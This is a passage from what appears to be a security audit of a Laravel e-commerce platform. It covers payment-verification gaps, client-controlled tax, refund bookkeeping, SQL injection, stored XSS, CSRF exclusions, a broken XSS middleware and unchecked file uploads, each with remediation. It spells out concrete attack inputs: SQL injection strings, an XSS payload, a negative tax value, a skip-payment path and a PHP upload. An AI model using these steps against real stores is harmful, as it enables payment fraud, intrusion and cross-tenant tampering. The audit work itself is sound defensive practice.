#### SEC-27 — Refunds never move money, and the refund write has no permission check or tenant scope
**HIGH · P0 · Status VERIFIED · Implementation: refund payout MISSING; status bookkeeping PARTIALLY IMPLEMENTED**

**Where.** `repo-A routes/web.php:961` →
`repo-A app/Http/Controllers/OrderRefundController.php:229-249`, which is the **entire** refund action:

```php
229: public function RefundAmonut(Request $request, $id)
231:     $order = Order::find($id);
232:     $order_refund = OrderRefund::findorFail($request->refundId);
238:     $amount = (float) preg_replace('/[^0-9.]/', '', $request->refund_amount);
240:     $order_refund->update([
241:         'refund_status' => 'Refunded',
242:         'refund_amount' => $amount
243:     ]);
```

**Fact 1 — no gateway refund is ever invoked.** A grep for call sites of every refund method in the
codebase (`->refund(`, `->initiateRefund(`, `->getRefund(`) returns **zero hits** across `app/` and all
69 addons. Refund client code exists but is dead: `repo-A app/Package/Payment.php:231` is a real Tap
`api.tap.company/v2/refunds` call with no callers (even though the same class *is* used for charges at
`repo-A app/Http/Controllers/PaymentController.php:943`);
`repo-A app/Libraries/PhonePe/PhonePe.php:107` and `repo-A app/Libraries/Easebuzz/refund.php` have no
callers at all. The string `'Refunded'` is written only at `OrderRefundController.php:241` and read only
for a display badge (`repo-A app/DataTables/OrderRefundDataTable.php:53`). No customer wallet credit, no
`order.final_price` adjustment, no ledger entry.

**Fact 2 — no permission check and no store scope on the write.** Walking outward from
`repo-A routes/web.php:961`, the only enclosing groups are `['web']` (`:305`) and
`['auth','xss','setlocate','verified']` (`:326`); the route adds only `->middleware('themelanguage')`.
The controller has no `__construct` middleware and no FormRequest, and `App\Models\OrderRefund`
(`repo-A app/Models/OrderRefund.php:10-24`) has no global scope, `booted()` or store-scoping trait.
`isAbleTo('Manage Order Refund Request')` and `getCurrentStore()` appear in `index()` (`:27-29`) and
elsewhere but are **absent from `RefundAmonut`**, which resolves the target by raw id at `:231-232`.
`'Manage Order Refund Request'` is a discrete grantable permission
(`repo-A app/Models/Utility.php:2829,3040`), so staff can legitimately lack it.

**Two attacker paths, neither anonymous.**
*Path 1 — vertical escalation inside one store.* A logged-in staff account whose role omits
`Manage Order Refund Request` — and which is therefore denied the refund list entirely at `:27` — can
still `POST /refund-amount/1` with `refundId=<any id>&refund_amount=999999&isTrendingChecked=true`,
flipping that record to `Refunded` with an arbitrary figure **and**, via `:233-236`, zeroing
`delivery_price` on whichever Order the `{id}` path segment names. Replayable: nothing checks that
`refund_status` is currently `Accept`, and the only "already done" suppression is browser
`localStorage.getItem('refundedClicked')`
(`repo-A resources/views/order/refund_details.blade.php:385-387`).
*Path 2 — cross-tenant write, and more serious.* `refundId` is unscoped, so store A's staff can flip
refund records belonging to store B and zero `delivery_price` on store B's orders — breaking the isolation
the rest of the controller tries to enforce. The sibling `CancelRefundStatus`
(`repo-A app/Http/Controllers/OrderRefundController.php:148-182`) is equally unguarded and rewrites
`order->final_price`/`product_price`.

**Correction to the original framing.** The injected amount moves **no money** in either direction — it is
read back only for display (`refund_details.blade.php:371`). Neither path yields funds extraction; they
yield a **falsified refund ledger and a cross-tenant integrity breach**. CSRF is enforced, so neither is
drivable from an attacker's website. Hence HIGH, not CRITICAL.

**The genuinely P0 part is not the exploit.** Because no refund method anywhere is ever called, **every
refund in this platform fails for 100% of ordinary honest merchants with no attacker involved**: the record
reads `Refunded`, the customer is told the refund succeeded, and the card or wallet is never credited.
Every refund silently requires an out-of-band manual payout with no reconciliation record distinguishing
paid from unpaid.

**Remediation.** (1) Implement a real gateway refund per enabled gateway — `app/Package/Payment.php:231`
is a working Tap implementation to start from — and record a reconciliation row. (2) Add the missing
`isAbleTo` gate and `where('store_id', getCurrentStore())` scoping to `RefundAmonut`,
`CancelRefundStatus` and `updateFinalPrice`. (3) Enforce the refund state machine server-side instead of
in `localStorage`. (4) Until (1) ships, change the UI wording so no merchant or customer is told a refund
was issued when it was not.

### 1.5 Payment security

#### SEC-11 — The shared payment-return handler never checks whether payment succeeded
**CRITICAL · P0 · Status VERIFIED**

**Where.** `repo-A routes/customer.php:154`
(`Route::any('{storeSlug?}/get-payment-status', [PaymentController::class, 'getProductStatus'])`) →
`repo-A app/Http/Controllers/PaymentController.php:897`.

**The defect.** A `return_type=success|cancel` marker is **written in 11 places**
(`repo-A app/Services/PaymentService.php:365-366`, `:387-400`, `:695-696`, `:3859-3860`, `:4266`;
`repo-A app/Http/Controllers/PaymentController.php:105,182,204,207,264,276,279`) and **read in zero
places** in the store commerce core. The only repo-wide reader is
`repo-A packages/workdo/Campaigns/src/app/Http/Controllers/CampaignsController.php:131`, an unrelated
module that does not serve this route. The handler performs outcome verification for **exactly three
gateways** — PhonePe (`PaymentController.php:913-925`), toyyibpay (`:929-939`) and Tap (`:941-953`). For
every other gateway, execution reaches

```php
1353: $order->payment_type = $requests_data['payment_type'];
1354: $order->payment_status = 'Paid';
```

on the **straight-line path with no conditional on payment outcome**.

**Attacker path.** Actor: anonymous guest shopper (guest checkout is supported —
`repo-A app/Http/Controllers/PaymentController.php:1305-1306`). (1) Fill a cart and
`POST {storeSlug}/process-order` selecting Stripe; `repo-A app/Services/PaymentService.php:409-410`
writes the complete order payload into the session and redirects to Stripe Checkout. (2) Pay nothing and
instead follow Stripe's own cancel link — **which the platform itself generated as `cancel_url`** at
`repo-A app/Services/PaymentService.php:395-400` — or simply type the URL. (3) Arrive at
`GET {storeSlug}/get-payment-status`. CSRF does not apply (GET), and the only route middleware is
`[ActiveTheme, 'themelanguage']` with no auth. (4) `getProductStatus` reads the still-intact session
payload at `:899`, matches none of the three guarded gateways, and reaches `:1354`, persisting an Order
with `payment_status = 'Paid'` and decrementing stock. **Obtained: a fully paid-marked order for zero
payment, repeatable per checkout session.**

**It is broader than an attack.** PayPal (`repo-A app/Services/PaymentService.php:712-713`) and Skrill
(`:575-576`) send success **and** failure to this same endpoint with byte-identical URLs and no
distinguisher at all, so no reader could ever have been written. And paymera's own callback **explicitly
redirects a NOT-approved payment into this order-creating handler**
(`repo-A app/Http/Controllers/PaymentController.php:101-107`), so **every declined paymera transaction
books a `Paid` order automatically** with no malice involved.

**Two precisions from the adversarial pass.** (a) The "direct URL visit" variant holds only while the
session still carries `request_data` — i.e. between the process-order redirect and the first landing on
the handler, which forgets the key at `:968` — so it is a skip-payment/replay **inside a live checkout
session**, not arbitrary order forgery from a cold session. (b) Whether a cold-session visit creates a
junk Paid order is UNKNOWN and is not needed for the finding. (c) One non-load-bearing inference could not
be cited: that Laravel's URL generator appends the `&`-prefixed positional value raw, so the URL truly
carries `?return_type=cancel`. Either way, the marker is unread.

**Across the gateway callbacks that were read:** of the **8** gateway callbacks read line-by-line,
**2 verify properly** (Tap, PhonePe), 2 partially (Paymera, toyyibpay), **0 verify the amount**, and
**0 verify any inbound signature**. The remaining **~44 of the ~52** wired payment types were **NOT
READ** and are **UNKNOWN, not clean** — see Appendix A and `10-OPEN-QUESTIONS-AND-DECISIONS.md` §2.2. For
Paystack/Razorpay/Flutterwave/PaymentWall the browser JavaScript simply does
`window.location.href = <success url>` and the transaction reference is never sent to the server.

**Remediation.** Every gateway return must be verified **server-side** before an order is created: read
the gateway's own transaction status by reference, compare the **captured amount** to the order total, and
only then set `payment_status`. The correct pattern already exists in this codebase —
`repo-A app/Http/Controllers/PaymentController.php:74-104` (`handlePaymeraCallback`) re-polls the gateway
at `:97-99`, checks `status != 'A'` at `:101`, and has a cache-based replay guard at `:76,87`. Lift that
shape for every gateway. Until then: **NO-GO on live payments.**

---

#### SEC-12 — Tax taken from the HTTP request flows into the amount charged
**CRITICAL · P0 · Status VERIFIED**

**Where.** `repo-A routes/customer.php:150` → `repo-A app/Http/Controllers/PaymentController.php:316`
(`processOrder`) → `processShipping` at `:762`.

```php
764: $tax_price = $request->tax_price ?? 0;
766: if (!$plan || $plan->shipping_method != 'on' || empty($request->method_id)) {
767:     return ['delivery_price' => $delivery_price, 'tax_price' => $tax_price];
```
```php
790: 'shipping_final_price' => $delivery_price,
791: 'tax_price' => $tax_price,
792: 'cartlist_final_price' => $cartlist_final_price + $delivery_price + $tax_price,
```

**Attacker path.** Anonymous visitor (this route sits outside the `auth:customers` group, which only opens
at `repo-A routes/customer.php:175`; a CSRF token comes free with the rendered checkout page).
(1) Add a product worth 100,000 to the guest cart. (2) `POST /{storeSlug}/process-order` with the normal
body plus **one edited field**: omit `method_id` and send `tax_price=-99999`. (3) `processShipping` sees
`empty($request->method_id)`, so it returns `tax_price` **exactly as posted** — no cast, no `abs()`, no
`min:0`. (4) `prepareFinalRequestData` computes
`cartlist_final_price = 100000 + 0 + (-99999) = 1`. (5) Every gateway handler uses that value verbatim as
the charge amount — e.g. `repo-A app/Services/PaymentService.php:210-224` casts it to int and passes
`'amount' => 1`. (6) On callback, `handlePaymeraCallback` checks only `status == 'A'` and **never compares
the captured amount to the order total**, then creates the order as `Paid` and decrements stock. The
merchant ships 100,000 of goods for 1.

The value is also persisted to `$order->tax_price`
(`repo-A app/Services/PaymentService.php:2247`) and to `OrderTaxDetail->tax_final_amount` (`:2463`,
taken straight from `$requests_data['tax_price']`). On the COD and bank-transfer branches
(`repo-A app/Services/PaymentService.php:140-142`) there is no charge at all, and the recorded amount owed
on delivery can be driven below zero.

**Two scope corrections the adversarial pass insisted on — do not overstate this.**
1. **Shipping** (`repo-A app/Models/Cart.php:198`, `repo-A app/Http/Controllers/Api/ApiController.php:188`)
   corrupts the **persisted** `$order->final_price`/`delivery_price` and is even *preferred over* the
   server computation at `repo-A app/Services/PaymentService.php:2032-2034` — but it does **not** reach
   the gateway amount, because `prepareFinalRequestData` overwrites `shipping_final_price` with the
   server-derived value at `PaymentController.php:790` before PaymentService reads it, and the amount's
   base excludes shipping.
2. **Coupon discount** (`repo-A app/Http/Controllers/PaymentController.php:728-733`) likewise corrupts the
   saved order and coupon records but does **not** reduce the gateway charge, because `processCoupon`
   returns `cartlist_final_price` unchanged at `:730-733`. A partial check does exist:
   `repo-A app/Services/PaymentService.php:1925-1930` requires `coupon_info[coupon_id]` to resolve to a
   real `Coupon` row for the store and enforces the per-user limit — but never the amount, the expiry or
   the discount rule.
3. **The mobile/API order path is NOT affected for tax or coupon.** `ApiController::place_order`
   (`repo-A routes/api.php:104-105`) recomputes tax server-side
   (`repo-A app/Http/Controllers/Api/ApiController.php:3005-3024`) and **always** calls `apply_coupon`
   (`:2985-3002`, taking only `coupon_code`). Only the shipping leak survives there. This must be worded
   as a **web-checkout** defect, not a codebase-wide one.

**The only validation on the whole path** is `billing_info`, `payment_type` and `customer_id` =>
`required` (`repo-A app/Services/PaymentService.php:1946-1957`) plus billing-field presence checks
(`repo-A app/Http/Controllers/PaymentController.php:578-600`). No FormRequest, no `numeric|min:0`, and no
equality assertion between the client-supplied and database-derived values anywhere between
`PaymentController.php:316` and `$order->save()`.

**Additional money-path defects confirmed in the same area.** The entire checkout runs with **zero DB
transactions and zero row locking** — `grep "DB::"` over `repo-A app/Services/PaymentService.php` returns
**0 hits for the whole file**, and the same over `repo-A app/Http/Controllers/PaymentController.php`
returns 0. Stock decrement is a plain unlocked read-modify-write with no quantity guard and no floor at
zero (`repo-A app/Services/PaymentService.php:2162-2164` non-variant, `:2090-2092` variant), and the
column is a **signed** integer (`repo-A database/migrations/2023_12_26_092822_create_products_table.php:33`
`$table->integer('product_stock')->default(0)`), so a single request with `qty` greater than stock drives
it negative — no concurrency race required, because `qty` is taken raw at
`repo-A app/Http/Controllers/CartController.php:189` with no validator and never compared to available
stock. Separately, **both stock-restore paths are a silent no-op for non-variant products**:
`repo-A app/Models/Order.php:620-625` and
`repo-A app/Http/Controllers/OrderController.php:461-466` overwrite the loop array with an Eloquent model
and then read `$product['qty']`, but `products` has no `qty` column, accessor, cast or append
(`grep "qty" repo-A app/Models/Product.php` → 0 hits), so `+= null` adds nothing and returned inventory is
never restocked. The sibling **variant** branches (`Order.php:629`, `OrderController.php:470`) are correct,
so the inventory drift is silent and selective — the hardest pattern to notice from a dashboard.

**Remediation.** Recompute **every** money component server-side at order creation — product subtotal,
shipping, tax and discount — and treat the client's figures as display-only hints to be compared, not
trusted. Add `numeric|min:0` validation as a backstop, wrap order creation plus stock decrement in a
transaction with `lockForUpdate`, add a quantity-versus-stock check before checkout, and make
`product_stock` unsigned with a floor. Fix the `$product['qty']` shadowing in both restore paths and in
the third entry point at `repo-A routes/api.php:110` →
`repo-A app/Http/Controllers/Api/ApiController.php:6292`, plus the identical copy at
`repo-A packages/workdo/AuctionProduct/src/app/Models/AuctionProductOrder.php:308`.

---

### 1.6 Injection, XSS and CSRF

#### SEC-22 — SQL injection in the product-search API
**HIGH · P0 · Status VERIFIED**

**Where.** `repo-A app/Http/Controllers/Api/ApiController.php:4494-4496`, inside `search()` (opens
`:4469`):

```php
4494: if (!empty($request->rating)) {
4495:     $product_query->whereRaw('ROUND(average_rating) =' . $request->rating);
4496: }
```

Raw request input concatenated into SQL. No cast, no `intval`, no binding, and **no `Validator::make`
anywhere in the method**. The surrounding filters use safe builder methods (`:4487` bound `like`, `:4491`
`whereIn`, `:4498-4505` `whereBetween`), which is what makes this the lone defect rather than a house
style. Routed twice and anonymously reachable per SEC-01:
`repo-A routes/api.php:60` (`{slug}/search`) and `:61` (`{slug}/search-guest`). The injection point is a
**numeric context with no quoting to escape** — the easy case: `rating=1 OR 1=1`,
`rating=1 UNION SELECT …`, or time-based blind via `rating=1 AND SLEEP(5)`. The `xss` middleware is not
applied to `routes/api.php` and would not help regardless (SEC-35).

**Scope correction, stated deliberately, because it changes the remediation budget.** The raw-SQL counts
look alarming but the exposure is narrow. Totals across `app/ packages/ resources/ themes/`: `whereRaw`
100, `DB::raw` 64, `selectRaw` 60, `DB::statement` 6, and **0** each for `orderByRaw`, `havingRaw`,
`groupByRaw`, `DB::select`, `DB::unprepared`, `joinRaw` — 230 call sites, **1 exploitable**. Single-line,
multiline and concatenation interpolation sweeps were run over all of it:
- `ApiController.php:4495` is the **only** site that interpolates request input.
- The ~40 repeated `PlanCoupon::whereRaw('BINARY \`code\` = ?', [$request->coupon])` sites across the
  payment controllers are **correctly parameterised**.
- All `selectRaw`/`DB::raw` aggregate sites are **static string literals**.
- All 6 `DB::statement` calls are the constant `SET FOREIGN_KEY_CHECKS` toggles
  (`repo-A app/Models/Utility.php:3115,3117,3140,3142,3156,3158`).
- One **non-request** second-order interpolation:
  `repo-A packages/workdo/AuctionProduct/src/resources/views/auctionorder/biding_view.blade.php:30`
  interpolates a DB-sourced integer into `whereRaw("FIND_IN_SET(...)")` — **LOW**, but it is
  query-building inside a Blade view, which is an architectural smell.

**DataTables — a negative result, reported because it was asked.** Across all 39 files in
`repo-A app/DataTables/` there is **no** dynamic column or sort name taken from the request: no
`request()->get('order')`, no `input('columns')`, no `->order[` patterns. Ordering and searching go
through `yajra/laravel-datatables` v11.0.0, which resolves column names against the declared column set.
**The DataTables risk here is XSS, not SQLi** — see SEC-23.

**Remediation.** One line: `whereRaw('ROUND(average_rating) = ?', [(int) $request->rating])`, or better
`->where('average_rating', '>=', …)`. Add a `numeric|between:1,5` rule to `search()`. The correct
`whereRaw(…, [bindings])` idiom is already used ~40 times in this codebase. **No coupling, no
prerequisites — do this today.**

---

#### SEC-23 — Stored XSS: anonymous API registration into an unescaped admin DataTable
**HIGH · P0 · Status VERIFIED**

A complete three-hop chain, every hop read in source.

**Hop 1 — injection, unauthenticated.** `repo-A app/Http/Controllers/Api/AuthController.php:32`
validates `'first_name' => 'nullable|string|max:255'` and `:79` assigns it straight through
(`$user->first_name = $request->first_name ?? null;`). No HTML escaping, no sanitisation. The route
`repo-A routes/api.php:46` (`{slug}/register`) carries only `APILog` — **no auth and no `xss`
middleware**.

**Hop 2 — storage.** Persisted raw to `customers.first_name`.

**Hop 3 — unescaped render in the admin UI.**
`repo-A app/DataTables/CustomerDataTable.php:36-42` concatenates the stored values into an HTML fragment:

```php
38: <span class="btn-inner--text text-capitalize">' . $customer->first_name . ' ' . $customer->last_name . '</span><br></a>' . $customer->mobile;
```
and `:94` declares the column **raw**, which tells DataTables not to escape it:
```php
94: ->rawColumns(['first_name', 'email', 'last_active', 'regiester_date', 'orders', 'total_spend', 'aov', 'action', 'status']);
```

**Impact.** An anonymous `POST /api/{slug}/register` with `first_name` = `<img src=x onerror=…>` yields
script execution in the **merchant/admin** browser session the next time the Customers list is opened —
i.e. an unauthenticated actor executes script in a privileged session. `first_name`, `last_name` and
`mobile` are all injectable this way. There is **no CSP anywhere** to blunt it (SEC-28), and the `xss`
middleware neither applies to `routes/api.php` nor would help (SEC-35).

**Remediation.** Escape at the sink: remove `first_name`, `email` and `mobile` from the `rawColumns` list
at `:94` and build that column with escaped values (or use a Blade partial with `{{ }}`). Add input
validation that rejects angle brackets on name fields. Add a CSP.

---

#### SEC-28 — 2,392 unescaped Blade sinks, no HTML sanitiser available, no security headers
**HIGH · P1 · Status VERIFIED · Implementation: MISSING**

**Measured.** `{!! !!}` appears **2,392 times** across `resources/`, `themes/` and `packages/` in Repo A
(re-counted while writing this document). Most are benign — `Form::` helpers, `trans()`,
framework-generated markup. The exploitable subset renders attacker- or tenant-controlled database content
with no escaping and no sanitisation. The worst classes:

| Class | Representative sink | Write path |
|---|---|---|
| Customer → public storefront | `repo-A themes/stylique/views/main_file.blade.php:309` `{!! $review->description !!}`; `themes/techzonix/views/main_file.blade.php:228` | `repo-A app/Http/Controllers/Api/ApiController.php:4781` (`product_rating`), validation presence-only, route `repo-A routes/api.php:67` — anonymous per SEC-01 |
| Merchant → public storefront | `repo-A resources/views/front_end/pages/product-detail.blade.php:123` `{!! $product->description !!}`; `resources/views/front_end/theme_common_table.blade.php:45`; the three themes' `components/blog-card.blade.php` and `front_end/partison/footer.blade.php` | `repo-A app/Http/Controllers/ProductController.php:282,523,1063` assign `$request->description` unsanitised |
| Customer → agent/admin | `repo-A packages/workdo/Helpdesk/src/resources/views/helpdesk_ticket/show.blade.php:28,59`; `ticket_reply.blade.php:46,77` | ticket submission |
| Merchant → platform admin | `repo-A resources/views/category/create.blade.php:22`, `category/edit.blade.php:23`, `testimonial/create.blade.php:17`, `plans/stripe.blade.php:1252` | ordinary CRUD |
| **JS-context** (different sink class) | `repo-A themes/stylique/views/front_end/layouts/app.blade.php:102,110`; greentic `:97,105`; techzonix `:178,186`; Helpdesk `master.blade.php:101,107` — `notifier.show('Success', '{!! $message !!}', …)` | any flash message echoing user input |

The JS-context sinks matter separately: a single `'` breaks out of the string literal into executable
JavaScript, so **HTML escaping would not even be the right fix** there — `@json($message)` is.

**There is no server-side HTML sanitiser available.** `jq -r '.require|keys[]' composer.json | grep -iE
"purif|sanitiz|html"` returns only `konekt/html`, which is a **form/HTML builder**, not a sanitiser. No
HTMLPurifier, no `mews/purifier`. Fixing this properly therefore requires **adding a dependency** — one of
the few places in this audit where that is true.

**No security headers exist anywhere.** A case-insensitive search for
`Content-Security-Policy|X-Frame-Options|X-Content-Type-Options|Strict-Transport-Security` across
`app config .htaccess public/.htaccess` returns **0 matches** (re-verified). Consequences, each tied to
another finding: no CSP means SEC-23 and these sinks execute unimpeded and can exfiltrate freely; no
`nosniff` amplifies the SVG upload risk (SEC-15); no `X-Frame-Options` leaves the admin UI clickjackable.
A strict CSP is the single highest-leverage **mitigation** while 2,392 sinks are worked through, which is
why this is P1 rather than P2.

**Partial mitigation, noted for fairness.** Eight sites wrap the same field in `strip_tags()` — e.g.
`repo-A themes/greentic/views/components/product-card.blade.php:25`. So the codebase is **inconsistent**:
the same data is escaped on some themes and raw on others. `strip_tags()` is weak (it does not neutralise
attribute-context injection) but is far better than nothing.

**Remediation.** (a) Ship a CSP in `Content-Security-Policy-Report-Only` mode first — this codebase uses
inline `<script>` heavily, so a strict CSP will break things and needs a staged rollout — then enforce,
and add `nosniff`, `X-Frame-Options` and HSTS. (b) Add a real sanitiser and apply it **on write** to
rich-text fields. (c) Convert the sinks above to `{{ }}` except where sanitised HTML is genuinely
required, and use `@json()` for the JS-context ones. (d) **A one-off cleanup pass over existing stored
descriptions, testimonials and ticket bodies is required** — sanitising on write does not retroactively
clean existing rows. This finding is a **floor, not a ceiling**: 486 Blade files were triaged by
data-source pattern, not all opened.

---

#### SEC-29 — The CSRF exclusion list contains five unjustifiable entries
**HIGH · P1 · Status VERIFIED**

**CSRF protection is active**, and that should be said first: Laravel 11 has no
`app/Http/Middleware/VerifyCsrfToken.php` and no `app/Http/Kernel.php` here, and configuration is
`$middleware->validateCsrfTokens(except: [...])` at `repo-A bootstrap/app.php:33-64` — **30 entries**.
Judgement on each class:

| Pattern (line) | Justified? | Reasoning |
|---|---|---|
| `'/login'` (`:48`) | **NO — HIGH** | `repo-A routes/auth.php:23` is the merchant/admin login. Enables login-CSRF: force a victim into an attacker-controlled account, then harvest what they do in it. There is no legitimate reason to exempt a first-party login form. |
| `'/duologin'` (`:49`) | **NO — HIGH** | Same class. |
| `'*/checkout'` (`:57`) | **NO — HIGH** | `repo-A routes/customer.php:61` is `Route::any('{storeSlug?}/checkout', …)` — a money-moving endpoint, exempted **and** accepting any verb. Forced-order / cart-tampering CSRF. |
| `'join_us/store/'` (`:60`) | **NO — MEDIUM** | Public form POST; exemption enables automated forged submissions. |
| `'delivery-syria/status'` (`:62`) | **NO — CRITICAL** | This is SEC-14. The endpoint has no auth *and* no signature, so removing CSRF removes the last control. |
| `'store/paymera/trigger/*'` (`:61`) | Conditionally | Legitimate *shape* (inbound gateway POST) only if the handler verifies authenticity — `handlePaymeraCallback` does. |
| ~24 gateway callbacks (`:35-59`) | **Shape justified** | External servers cannot carry a CSRF token, so exemption is correct and standard. **But each must verify an HMAC or signature instead**, and only one was spot-checked. |

**A second, easily-missed exclusion mechanism.** Beyond the `except` list, CSRF is also removed inline at
`repo-A routes/web.php:1017`
(`->withoutMiddleware(\Illuminate\Foundation\Http\Middleware\ValidateCsrfToken::class)`). Anyone auditing
only `bootstrap/app.php` would miss it. (The route it guards, `/zid/events/{v?}`, is one of the better
ones — it verifies a shared secret.)

**State-changing GET routes — the answer to the question that was asked.** The first sweep for
`Route::get` bound to `destroy|delete|update|store` **returned nothing**: the stock Workdo resource routes
are verb-correct. A broader sweep found real ones:
`repo-A routes/web.php:1026` (`Route::match(['GET','POST'], …update-status)`, the SEC-14 endpoint — worst
case, unauthenticated *and* GET, so it fires from an `<img>` tag); `repo-A routes/web.php:339`
(`GET user-enable-login/{id}`), `:364` (`GET request-cancel/{id}`), `:662`
(`GET store-reset-password/{id}`), `:696` (`GET deliveryboy/reset-password/{id}`) — privileged state
changes over GET, authenticated, so exploitation is via CSRF or link prefetch;
`repo-A routes/customer.php:188,189` (`GET delete-addressbook`, `GET delete-wishlist`), `:202`
(`GET destroy-ticket/{eid}`) — customer-destructive over GET; and ~17 further `GET …/delete/{key}` routes
in `repo-A packages/workdo/LandingPage/src/Routes/web.php`. **For all of these the `except` list is
irrelevant — the verb itself is the defect**, because GET requests never carry CSRF tokens.

**Remediation.** Remove the five unjustifiable exclusions (`repo-A bootstrap/app.php:48,49,57,60,62`) and
change `Route::any` at `repo-A routes/customer.php:61` to `POST`. **Risk to anticipate:** exempting login
is sometimes a workaround for a session or cookie bug — if re-enabling breaks login, find the real cause
rather than re-exempting. Then convert the privileged GET routes to POST/DELETE, prioritising
`store-reset-password`, `deliveryboy/reset-password` and `user-enable-login`; every Blade link to them
becomes a form or AJAX call, which is mechanical but wide. Finally, audit the remaining ~24 gateway
callbacks for signature verification individually — only one was checked here.

---

#### SEC-35 — The "XSS middleware" provides no XSS protection and silently corrupts passwords
**MEDIUM · P1 · Status VERIFIED · Implementation: PLACEHOLDER OR MOCK**
*(Severity corrected downward from CRITICAL, and the mechanism corrected, by the adversarial pass. The
corrected version matters, because the original wording would send a team to fix the wrong thing.)*

**Where.** `repo-A app/Http/Middleware/XSS.php:51-61`:

```php
51: $input = $request->all();
53: array_walk_recursive($input, function (&$value) {
54:     if (is_string($value)) {
55:         $value = htmlspecialchars_decode($value);
56:         //$value = preg_replace('/<\s*script\b[^>]*>(.*?)<\s*\/\s*script\s*>/is', '', $value);
57:         $value = str_replace(['&lt;', '&gt;', 'javascript', 'alert'], '', $value);
58:     }
59: });
60: $request->merge($input);
```

**What the original claim got wrong.** It asserted that the decode at `:55` converts a blocked
entity-encoded payload into live markup — i.e. that the control meant to stop XSS is what enables it. That
mechanism is **refuted**: the denylist at `:57` never removes literal `<` or `>`, only their entity forms.
A raw payload such as `<img src=x onerror=…>` traverses the middleware **essentially untouched in every
case, with or without the decode**. An attacker has no reason to submit the entity-encoded form, and no
upstream layer in this codebase imposes one (verified: no HTMLPurifier, no encoding mutator, and only two
FormRequest classes in the entire app — `repo-A app/Http/Requests/` holds `Auth/` plus
`ProfileUpdateRequest.php`). What the decode-before-entity-denylist ordering actually proves is that the
middleware is **self-defeating and approximately a no-op for XSS**, not an amplifier of it.

**"Net-negative" is nevertheless CORRECT — on data-integrity grounds.** The blind `str_replace` silently
mutates credential fields, and there is a fully verified failure path with no attacker at all:
1. `repo-A routes/web.php:782` (`PUT user-password-update`) sits inside the `xss` group spanning
   `repo-A routes/web.php:326-938`.
2. A user chooses a password containing the lowercase substring `alert` or `javascript` — e.g.
   `Winter-alert-2026`.
3. `XSS.php:57` rewrites `new_password` to `Winter--2026` **before the controller runs**, and `:60` merges
   it back.
4. `repo-A app/Http/Controllers/UserController.php:406` stores `Hash::make($request->new_password)` — the
   hash of the **mutated** string. The UI reports success.
5. `POST /login` (`repo-A routes/auth.php:23`) carries only `throttle:auth` and **not** `xss`, so the
   typed `Winter-alert-2026` passes through intact.
6. `Hash::check` fails. The account is permanently locked out with no error explaining why, and the same
   mutation breaks the `old_password` check at `UserController.php:400`, so self-service recovery through
   that form also fails.

The same corruption applies to every string field submitted to the ~610 lines of routes in that group —
store names, product descriptions, addresses, and e-mail addresses such as `alerts@example.com`.

**Reach — wider in one direction, narrower in another.** There are **three** applications, not two:
`repo-A routes/web.php:326`, `repo-A packages/workdo/LandingPage/src/Routes/web.php:33`, and
`.../web.php:350` (which is **unauthenticated** and was missed in the first pass). The group at
`web.php:326-938` is not "narrow" — it is most of the admin/merchant panel. Conversely the one
anonymous-reachable route yields no exploit: its single `email` parameter is validated
`required|email|unique:join_us`
(`repo-A packages/workdo/LandingPage/src/Http/Controllers/JoinUsController.php:123`) and rendered through
an escaped sink
(`repo-A packages/workdo/LandingPage/src/Resources/views/landingpage/newsletter/join_user/index.blade.php:23`).
It is also **barely applied where it would matter**: not to `routes/api.php`, not to
`routes/customer.php` (the storefront), not to `routes/auth.php` — the exact inverse of what you would
want.

**Remediation. Delete the middleware rather than repair it.** Extract the unrelated pending-migration
logic at `repo-A app/Http/Middleware/XSS.php:27-49` into its own middleware first (it redirects
super-admins to the updater and is relied upon), then remove the `:51-60` block and the `'xss'` alias at
`repo-A bootstrap/app.php:21`. Address output escaping at the `{!! !!}` sinks instead (SEC-28). **Note for
the team:** if anyone currently believes this middleware is protecting them, they must be told plainly
that it is not — that belief is itself a risk.

### 1.7 File upload and remote code execution

#### SEC-15 — Authenticated arbitrary file write into the webroot with attacker-controlled extension
**CRITICAL · P0 · Status VERIFIED (code path) / SUSPECTED (that a written `.php` executes) · Implementation: PARTIALLY IMPLEMENTED (validation exists but is bypassed)**

Three facts compose; the composition is the finding.

**(a) The `theme` disk writes to the application root.** `repo-A config/filesystems.php:47-51`:
```php
47: 'theme' => [
48:     'driver' => 'local',
49:     'root' => base_path(''),
50:     'throw' => false,
51: ],
```
`Utility::upload_file()` writes through exactly this disk (`repo-A app/Models/Utility.php:384`). Combined
with SEC-32, uploads land in web-served space. The committed `uploads/11/…`, `uploads/15/…` tree (407
tracked files) and `$dir = 'uploads/' . getCurrentStore()`
(`repo-A app/Http/Controllers/AppSettingController.php:154`) confirm this is the live path.

**(b) The 6th argument disables validation entirely.** `repo-A app/Models/Utility.php:362-375`:
```php
362: if (empty($image)) {
363:     $validator = \Validator::make((is_array($request) ? $request : $request->all()), [
364:         $key_name => $validation
365:     ]);
366: }
369: if (empty($image) && $validator->fails()) {
```
When the caller passes a **non-empty** `$image`, the validator is never constructed (`:362`) and the
failure check short-circuits on its first conjunct (`:369`). Control falls straight through to the
`putFileAs` at `:384`. No extension check, no MIME check, no size check.

**(c) Call sites pass that argument, with no validator of their own.**
`repo-A app/Http/Controllers/AppSettingController.php:164-165`:
```php
164: $fileName = rand(10, 100) . '_' . time() . "_" . $theme_image->getClientOriginalName();
165: $upload = Utility::upload_file($request, $theme_image, $fileName, $dir, [], $theme_image);
```
The method opens at `:148` and reaches `:165` with **no `Validator::make`, no form request and no
`$request->validate()`**. The filename ends with `getClientOriginalName()`, so **the extension is whatever
the client sent**. Identical 6-argument form at `:210-211`, `:229-230`, `:378`, `:424`, `:450`, `:1238`.

**Reachability.** `repo-A routes/web.php:735` (`Route::resource('app-setting', AppSettingController::class)`)
sits inside the group at `repo-A routes/web.php:326` — `auth` and `verified` only, **no `permission:`
middleware**, in contrast to `repo-A routes/web.php:164` which shows the codebase does gate elsewhere. On a
multi-tenant SaaS where merchants self-register, this is reachable by the lowest-trust authenticated
tenant. The `xss` middleware in that group operates on request strings only and never inspects uploaded
files.

**Fact vs inference.** (a), (b), (c) and the missing `permission:` are facts read from source. Whether a
written `evil.php` **executes** is inference: it requires PHP to be handler-mapped for that directory,
which is the default on the Apache/mod_php shared-hosting layout this deployment's `.htaccess` implies. One
upload test on staging settles it; that could not be performed read-only.

**Honest downgrade of a sibling.** `repo-A app/Services/PaymentService.php:1889` uses the same 6-argument
bypass, but unlike `AppSettingController` it **is** preceded by a real validator at `:1878-1880`
(`'payment_receipt' => 'required|image'`) and its filename is `getClientOriginalName() . '_' . time()`
(`:1888`) — the appended timestamp destroys the trailing extension. Rated **MEDIUM**, not critical. (The
